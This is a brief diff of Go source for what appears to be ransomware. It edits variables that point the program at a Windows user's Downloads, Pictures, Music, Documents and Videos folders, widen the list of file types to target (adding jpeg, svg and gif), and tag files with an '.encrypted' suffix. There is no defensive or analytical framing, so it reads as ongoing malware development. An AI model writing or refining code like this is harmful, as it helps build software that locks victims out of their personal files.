@@ -1,5 +1,3 @@
-//
-
 package main
 
 import (
@@ -11,7 +9,7 @@ import (
 
 var (
 	InterestingDirs       = []string{"Downloads", "Pictures", "Music", "Documents", "Videos"}
-	InterestingExtensions = []string{"docx", "png", "jpg", "pdf", "txt", "html"}
+	InterestingExtensions = []string{"docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}
 	MatchedFiles          = []string{}
 	EncryptionExtension   = ".encrypted"
 	BaseDir               = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
